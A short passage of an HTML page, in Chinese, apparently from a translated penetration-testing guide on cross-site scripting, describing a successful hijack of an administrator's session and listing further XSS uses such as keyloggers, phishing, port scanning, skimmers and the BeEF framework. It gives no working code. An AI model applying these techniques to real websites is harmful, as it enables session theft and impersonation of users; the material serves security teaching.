+<a name="76je150kth1kb96uc8m1l3i6fi">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;成功劫持了管理用户的会话。 请注意，此攻击是特定于会话的。 一旦我们窃取了会话，我们就可以伪装成受害者，直到他们注销或会话终止。</a>
+</h3>
+<h3 class="topic">
+<a name="11dcspj2ire6ju3q2if3tl2ch0">&nbsp;&nbsp;其他XSS攻击媒介</a>
+</h3>
+<h3 class="topic">
+<a name="0t7894okge7v6q24ca864gl385">&nbsp;&nbsp;&nbsp;前面的部分说明了一些基本的XSS利用示例。 如果Web应用程序在显示之前没有过滤任何用户输入，则我们可以使用所有JavaScript，仅受我们可以插入的代码长度的限制。 即使有效负载大小有限，也可能会使用XSS来注入到外部JavaScript文件的链接，从而绕过大小限制。&#13;
+   XSS的潜在影响不仅限于窃取Cookie。 我们已经提到了重定向和客户端攻击。  XSS有效负载的其他示例包括击键记录器，网络钓鱼攻击，端口扫描和内容收集器/撇取器。  Kali Linux包括BeEF（浏览器利用框架），可以利用一个简单的XSS漏洞来发起许多不同的客户端攻击。</a>
+</h3>
+</body>
+</html>
